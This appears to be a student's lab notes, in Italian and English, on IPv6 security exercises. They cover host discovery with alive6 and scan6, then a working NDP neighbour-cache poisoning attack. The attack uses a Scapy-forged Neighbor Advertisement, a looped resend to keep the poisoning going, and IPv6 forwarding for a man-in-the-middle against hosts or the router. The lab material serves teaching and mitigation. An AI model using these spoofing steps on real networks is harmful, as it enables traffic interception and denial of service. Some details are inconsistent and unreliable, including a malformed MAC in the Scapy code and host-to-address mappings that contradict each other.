The tests `dig github.com @100.100.1.2` and `ping github.com` work.  
The test `ping google.com` works but does not receive packets, which is correct since the domain `google.com` is not allowed and therefore the firewall blocks the ping.



# _IPv6 security exercises_

## _Exercise 2.2: IPv6 Network Scanning_

## `alive6`
From Kali we use the tool:
```bash
┌──(user㉿pc1)-[~]
└─$ sudo atk6-alive6 eth0
Alive: 2001:470:b5b8:1e82:455:36ff:fea8:2642 [ICMP parameter problem]
Alive: 2001:470:b5b8:1e82:b89d:d3ff:feec:ea07 [ICMP parameter problem]
Alive: 2001:470:b5b8:1e82:64a3:2eff:fe83:1e7f [ICMP parameter problem]

Scanned 1 address and found 3 system alive
```

Before run it, we use `tcpdump -i any icmp6` on another host in the same subnet (e.g. arpwatch-clients):
```bash
root@arpwatch-clients:~# tcpdump -i any icmp6
tcpdump: data link type LINUX_SLL2
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
12:40:18.567140 eth0  M   IP6 kali.acme-30.test > ip6-allnodes: ICMP6, echo request, id 64206, seq 47806, length 16
12:40:18.567217 eth0  Out IP6 arpwatch-clients.acme-30.test > kali.acme-30.test: ICMP6, echo reply, id 64206, seq 47806, length 16
12:40:18.567394 eth0  Out IP6 arpwatch-clients.acme-30.test > kali.acme-30.test: ICMP6, parameter problem, option - octet 42, length 72
12:40:23.575976 eth0  Out IP6 fe80::b89d:d3ff:feec:ea07 > kali.acme-30.test: ICMP6, neighbor solicitation, who has kali.acme-30.test, length 32
12:40:23.576740 eth0  In  IP6 kali.acme-30.test > fe80::b89d:d3ff:feec:ea07: ICMP6, neighbor advertisement, tgt is kali.acme-30.test, length 24
12:40:28.646211 eth0  In  IP6 fe80::476a:a47b:68a:a64d > fe80::b89d:d3ff:feec:ea07: ICMP6, neighbor solicitation, who has fe80::b89d:d3ff:feec:ea07, length 32
12:40:28.646306 eth0  Out IP6 fe80::b89d:d3ff:feec:ea07 > fe80::476a:a47b:68a:a64d: ICMP6, neighbor advertisement, tgt is fe80::b89d:d3ff:feec:ea07, length 24
12:40:33.815970 eth0  Out IP6 fe80::b89d:d3ff:feec:ea07 > fe80::476a:a47b:68a:a64d: ICMP6, neighbor solicitation, who has fe80::476a:a47b:68a:a64d, length 32
12:40:33.816256 eth0  In  IP6 fe80::476a:a47b:68a:a64d > fe80::b89d:d3ff:feec:ea07: ICMP6, neighbor advertisement, tgt is fe80::476a:a47b:68a:a64d, length 24
12:41:54.278840 eth0  M   IP6 fe80::476a:a47b:68a:a64d > ip6-allrouters: ICMP6, router solicitation, length 8
12:43:56.517713 eth0  M   IP6 fe80::64a3:2eff:fe83:1e7f > ip6-allnodes: ICMP6, router advertisement, length 88
^C
11 packets captured
11 packets received by filter
0 packets dropped by kernel
```

**_Responses examination_**  
The output of `atk6-alive6` shows us all hosts alive in the subnet, in this case:
- `2001:470:b5b8:1e82:455:36ff:fea8:2642` -> arpwatch-clients
- `2001:470:b5b8:1e82:b89d:d3ff:feec:ea07` -> monitorserver
- `2001:470:b5b8:1e82:64a3:2eff:fe83:1e7f` -> internal-firewall


The traffic we have sniffed with `tcpdump` is ICMPv6 Neighbor Discovery (NDP). We have:
- **Neighbor Solicitation (NS)**
   ```
   ICMP6, neighbor solicitation, who has kali.acme-30.test
   ```
- **Neighbor Advertisement (NA)**
   ```
   ICMP6, neighbor advertisement, tgt is kali.acme-30.test
   ```
- **Echo request/reply**
   ```
   ICMP6, echo request / echo reply
   ```
- **Parameter problem** (e.g. ICMP packet with unexpected options, tool behavior)
   ```
   ICMP6, parameter problem
   ```


The `alive6` tool is able to discover multiple IPv6 hosts by leveraging ICMPv6 Neighbor Discovery and multicast probing. By sending multicast-based Neighbor Solicitation messages, it triggers Neighbor Advertisements from active hosts, allowing enumeration of devices within multiple subnets reachable through routing.  
This demonstrates how IPv6 networks are highly susceptible to host discovery due to mandatory ICMPv6 and multicast mechanisms.


**_P.S. Ho capito perchè nel comando nomina altri due host, A e B: "You can capture packets from another host, A or B, to see how alive6 tries to discover hosts on the subnet. You can use Scapy’s sniff() function or tcpdump." Perchè la rete degli esercizi è diversa (vedi sotto l'esercizio 2.1) infatti ha 3 host, A, B e C._**


## `scan6`
From Kali we use the tool:
```bash
┌──(user㉿pc1)-[~]
└─$ sudo scan6 -L -i eth0

┌──(user㉿pc1)-[~]
└─$ sudo scan6 -L -i eth0 -v
Link local addresses:

Global addresses:

```

- `scan6 -L` sta lavorando in modalità quasi completamente passiva
- non sta generando traffico ICMPv6 rilevabile
- probabilmente sta solo interrogando strutture locali del kernel / cache ND

Questa è ESATTAMENTE una differenza importante rispetto ad `alive6`.

## Interpretazione tecnica
`alive6`:
- invia multicast ICMPv6
- genera traffico visibile
- forza le risposte degli host

`scan6 -L`:
- può limitarsi a leggere:
   - routing table
   - neighbor cache
   - informazioni locali
- senza inviare pacchetti

Per questo tcpdump non vede nulla ma il comando viene comunque eseguito.

## Differences between `alive6` and `scan6`
`alive6` performs active IPv6 host discovery by sending multicast ICMPv6 packets to the local subnet.
This generates visible network traffic, including Echo Requests, Neighbor Solicitations, and Neighbor Advertisements, which can be observed with tools like tcpdump.

On the other hand, `scan6` -L behaved much more passively in our environment.
No observable ICMPv6 traffic was generated during execution, suggesting that the tool was relying on local Neighbor Discovery cache information and existing kernel data structures rather than actively probing the network.

Therefore:
- `alive6` is more aggressive and noisy
- `scan6` is stealthier and less detectable

## How to make IPv6 discovery harder
Possible mitigations include:
- enabling IPv6 privacy extensions
- filtering unnecessary ICMPv6 traffic
- rate-limiting Neighbor Discovery traffic
- segmenting networks
- disabling unused IPv6 services
- monitoring multicast traffic
However, completely blocking ICMPv6 is not recommended because IPv6 heavily depends on it for normal network operations.



## _Exercise 3.2-a: NDP Threats using NS/NA_

* **Host C (attacker)** → Kali
* **Host A (victim)** → arpwatch-clients
* **Host B (spoofed host)** → monitorserver

## Obiettivo reale dell’esercizio

Questo esercizio vuole mostrarci che:
> In IPv6, Neighbor Discovery (NDP) può essere falsificato facilmente.

In pratica:
* IPv6 usa NDP al posto di ARP
* le macchine si fidano dei messaggi NS/NA
* un attacker può avvelenare la neighbor cache


---

## Cosa succede nell’attacco

In uno scenario normale, se arpwatch-clients vuole parlare con monitorserver controlla la neighbor cache:
```bash
ip -6 neigh
```
e vede:
```bash
2001:470:b5b8:1e82:455:36ff:fea8:2642 dev eth0 lladdr 06:55:36:a8:26:42
```
(IPv6 e MAC di monitorserver)

In un attacco Kali (attaccante) invia un falso Neighbor Solicitation:
> “Ciao, io sono monitorserver
> e questa è la mia MAC”

Ma inserisce il proprio MAC address al posto di quello di monitorserver.

Quindi arpwatch-clients aggiorna la cache:
```bash
IPv6 di monitorserver -> MAC di Kali
```

Risultato:
* traffico destinato a monitorserver → finisce a Kali

---

## **_Step 1 — Recuperiamo MAC e IPv6_**

Su:
* Kali
* arpwatch
* monitorserver

eseguiamo:

```bash
ip -6 addr show
ip link show
```

Analizzando gli output, i valori che ci interessano sono:

**_Kali_**
MAC:
```text
e6:80:50:76:15:46
```

**_arpwatch_**
IPv6 globale:
```text
2001:470:b5b8:1e82:b89d:d3ff:feec:ea07
```
MAC:
```text
ba:9d:d3:ec:ea:07
```

**_monitorserver_**
IPv6 globale:
```text
2001:470:b5b8:1e82:455:36ff:fea8:2642
```
MAC:
```text
06:55:36:a8:26:42
```

---

# 📌 Step 2 — Verifichiamo che da arpwatch riesco a pingare monitorserver e dopodiché gurdiamo la neighbour cache della vittima

Su arpwatch-clients:
```
root@arpwatch-clients:~# ping6 -c 3 2001:470:b5b8:1e82:455:36ff:fea8:2642
PING 2001:470:b5b8:1e82:455:36ff:fea8:2642(2001:470:b5b8:1e82:455:36ff:fea8:2642) 56 data bytes
64 bytes from 2001:470:b5b8:1e82:455:36ff:fea8:2642: icmp_seq=1 ttl=64 time=0.803 ms
64 bytes from 2001:470:b5b8:1e82:455:36ff:fea8:2642: icmp_seq=2 ttl=64 time=0.156 ms
64 bytes from 2001:470:b5b8:1e82:455:36ff:fea8:2642: icmp_seq=3 ttl=64 time=0.164 ms

--- 2001:470:b5b8:1e82:455:36ff:fea8:2642 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2053ms
rtt min/avg/max/mdev = 0.156/0.374/0.803/0.303 ms
```

Diamo un'occhiata alla neighbour cache della vittima:
```
root@arpwatch-clients:~# ip -6 neigh show
fe80::455:36ff:fea8:2642 dev eth0 lladdr 06:55:36:a8:26:42 REACHABLE
fe80::64a3:2eff:fe83:1e7f dev eth0 lladdr 66:a3:2e:83:1e:7f router STALE
2001:470:b5b8:1e82:455:36ff:fea8:2642 dev eth0 lladdr 06:55:36:a8:26:42 REACHABLE
```

---

# 📌 Step 3 — Costruiamo il pacchetto Scapy

Su Kali:

```bash
sudo scapy
```

Poi, dentro Scapy:

```python
d = IPv6(src="2001:470:b5b8:1e82:455:36ff:fea8:2642", dst="2001:470:b5b8:1e82:b89d:d3ff:feec:ea07")
e = ICMPv6ND_NA(R=0, tgt="2001:470:b5b8:1e82:455:36ff:fea8:2642")
f = ICMPv6NDOptDstLLAddr(lladdr="e8:50:76:15:46")
pkt2 = d / e / f
send(pkt2)
```

Cosa sta dicendo questo pacchetto falso?
```text
Sorgente IPv6 = monitorserver
Destinazione IPv6 = arpwatch-clients
Target = indirizzo IPv6 di monitorserver
Target Link-Layer Address = MAC di Kali
```

Quindi Kali sta dicendo ad arpwatch-clients:
```text
"L’indirizzo IPv6 di monitorserver è associato al MAC di Kali"
```

---

# 📌 Step 4 — Controlla velocemente la cache

Subito dopo su arpwatch:
```
root@arpwatch-clients:~# ip -6 neigh show
fe80::455:36ff:fea8:2642 dev eth0 lladdr 06:55:36:a8:26:42 STALE
2001:470:b5b8:1e82:455:36ff:fea8:2642 dev eth0 lladdr e6:80:50:76:15:46 STALE
```

Prima dell’attacco abbiamo visto:
```text
2001:470:b5b8:1e82:455:36ff:fea8:2642 dev eth0 lladdr 06:55:36:a8:26:42 REACHABLE
```

Dopo l’attacco abbiamo:
```text
2001:470:b5b8:1e82:455:36ff:fea8:2642 dev eth0 lladdr e6:80:50:76:15:46 STALE
```

L'IPv6 appartiene a monitorserver mentre il MAC è di Kali, ciò significa che il poisoning è riuscito.

**NOTA**: è importante verificare velocemente `ip -6 neigh show` su arpwatch perché Linux:
* refresha la cache
* verifica reachability
* corregge automaticamente


---

## Altre domande dell’esercizio

## c) After sending the NS message to Host A, are you able to ping from Host A to Host B?

Nel nostro caso, dopo il poisoning, non riusciamo a pingare correttamente Host B.

Il motivo è che `arpwatch-clients`, quando prova a inviare pacchetti IPv6 verso `monitorserver`, non li manda più al MAC reale di `monitorserver`, ma al MAC di Kali:
```text
arpwatch-clients -> kali
```

invece di:
```text
arpwatch-clients -> monitorserver
```

Quindi, se Kali non inoltra il traffico verso `monitorserver`, il ping fallisce.

Comando da provare su `arpwatch-clients`:
```bash
ping6 -c 5 2001:470:b5b8:1e82:455:36ff:fea8:2642
```

Bozza risposta per il report:
```text
After poisoning the neighbour cache of Host A, the ping from Host A to Host B failed or became unstable. This happens because Host A resolves Host B's IPv6 address to the attacker's MAC address instead of Host B's real MAC address. Therefore, the Ethernet frames are sent to Kali and not to monitorserver.
```

---

## d) If the answer is no, how long does that effect last? How can you make the attack permanent?

L’effetto non è permanente se mandi un solo pacchetto falso. Dura pochi secondi o comunque finché la neighbour cache non viene aggiornata di nuovo correttamente.

Nel nostro output lo stato era `STALE`.

Questo significa che l’entry esiste, ma non è più considerata sicuramente valida. Quando la vittima prova di nuovo a comunicare, può fare nuove verifiche NDP e recuperare il MAC corretto.

Per rendere l’attacco “permanente” nel contesto del laboratorio, non si manda un solo NS/NA, ma si inviano pacchetti falsi continuamente.

Con Scapy su Kali:
```python
send(pkt2, inter=1, loop=1)
```

Questo invia un pacchetto falso ogni secondo, mantenendo avvelenata la cache.

Bozza risposta per il report:
```text
The effect lasts only for a short time, because neighbour cache entries expire or are revalidated by the host. To make the attack persistent, the attacker can continuously send forged NS/NA messages, for example using Scapy with send(pkt, inter=1, loop=1). In this way, even if the victim tries to refresh the neighbour cache, the attacker keeps injecting the fake IPv6-to-MAC mapping.
```

---

## e) Is it possible to make a MITM attack using this technique? How?

Sì, è possibile, ma non basta avvelenare una sola cache.

Con il poisoning semplice ottieniamo questo:
```text
arpwatch-clients -> kali
```

ma se Kali non inoltra il traffico, abbiamo solo un **DoS**.

Per fare un vero **Man-in-the-Middle**, Kali deve stare in mezzo tra A e B:

```text
arpwatch-clients -> kali -> monitorserver
monitorserver -> kali -> arpwatch-clients
```

Quindi dobbiamo fare due cose:

1. Avvelenare la cache di `arpwatch-clients`:
```text
IPv6 monitorserver -> MAC Kali
```

2. Avvelenare anche la cache di `monitorserver`:
```text
IPv6 arpwatch-clients -> MAC Kali
```

Poi Kali deve inoltrare i pacchetti IPv6.

Concettualmente, su Kali:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1
```

In questo modo Kali non blocca il traffico, ma lo riceve, lo osserva e lo inoltra.

Bozza risposta per il report:
```text
Yes, this technique can be used to perform a Man-in-the-Middle attack. The attacker must poison the neighbour cache of both hosts: Host A must associate Host B's IPv6 address with the attacker's MAC address, and Host B must associate Host A's IPv6 address with the attacker's MAC address. Then the attacker enables IPv6 forwarding and relays packets between the two victims. In this way, the attacker can intercept or manipulate the traffic while keeping the communication apparently working.
```

---

## f) What happens if instead of attacking the address of a host, you attack the address of the router?

Se invece di attaccare `monitorserver` attacchiamo l’indirizzo del **router/default gateway**, l’impatto è molto più grave.

Nel caso attuale abbiamo avvelenato:
```text
IPv6 monitorserver -> MAC Kali
```

Quindi compromettiamo solo il traffico da `arpwatch-clients` verso `monitorserver`.

Se invece avveleniamo:
```text
IPv6 internal-router -> MAC Kali
```

allora `arpwatch-clients` manda a Kali tutto il traffico che normalmente dovrebbe andare al gateway.

Quindi potremmo ottenere:
```text
arpwatch-clients -> kali -> internal-router -> altre reti / Internet
```

se Kali inoltra il traffico, quindi **MITM verso il traffico esterno**.

Oppure:
```text
arpwatch-clients -> kali -> traffico perso
```

se Kali non inoltra, quindi **DoS verso l’esterno**.


Bozza risposta per il report:
```text
If the attacker poisons the neighbour cache entry associated with the router instead of a normal host, the impact is more serious. The victim will send to the attacker all packets that should be sent to the default gateway. If the attacker forwards the packets, this can become a Man-in-the-Middle attack against traffic directed outside the local network. If the attacker does not forward the packets, the victim loses external IPv6 connectivity, causing a Denial of Service.
```

---

Bozza versione compatta per il report:

```text
After sending the forged NDP packet, Host A was not able to reliably ping Host B, because the neighbour cache entry for Host B's IPv6 address was modified to point to Kali's MAC address. As a result, packets intended for Host B were sent at layer 2 to the attacker. The effect is temporary because neighbour cache entries expire or are revalidated, but it can be made persistent by continuously sending forged NS/NA packets with Scapy, for example using send(pkt, inter=1, loop=1). This technique can also be extended to a MITM attack by poisoning both directions and enabling IPv6 forwarding on the attacker. If the attacked address is the router address instead of a host address, the victim may send all off-link traffic to the attacker, leading either to MITM if forwarding is enabled or to DoS if packets are dropped.
```
